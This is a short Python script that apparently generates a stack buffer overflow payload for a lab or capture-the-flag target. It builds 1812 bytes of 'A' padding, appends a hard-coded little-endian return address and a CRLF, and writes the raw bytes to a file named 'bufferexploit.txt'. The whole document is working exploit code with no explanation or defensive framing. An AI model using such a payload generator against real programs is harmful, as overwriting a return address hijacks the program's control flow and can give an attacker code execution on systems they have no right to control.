

filler = ''

for i in range(0, 1811 + 1):
    filler += '41'

returnaddress = '28' + '15' + '40' + '00' + '00' + '00' + '00' + '00' + '00'

newline = '0d' + '0a'

rawdata = bytes.fromhex(filler + returnaddress + newline)

with open("bufferexploit.txt", "wb") as file:
    file.write(rawdata)
	
